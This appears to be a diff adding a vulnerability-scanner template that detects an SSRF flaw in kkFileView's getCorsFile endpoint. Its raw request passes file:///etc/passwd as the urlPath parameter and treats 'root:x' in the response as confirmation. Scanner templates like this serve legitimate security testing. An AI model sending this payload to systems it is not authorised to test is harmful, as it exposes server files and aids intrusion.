@@ -1,0 +1,27 @@
+id: kkfileview-getcorsfile-ssrf
+
+info:
+  name: kkFileView getCorsFile Api urlPath SSRF vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    kkFileView is an online preview solution for files and documents. The `getCorsFile` API contains an SSRF vulnerability where the `urlPath` parameter is user-controllable. By modifying this parameter, attackers can trigger SSRF to access internal server information.
+  tags: ssrf
+  reference:
+    - https://fofa.so/
+
+http:
+  - raw:
+      - |
+        GET /getCorsFile?urlPath=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:x"
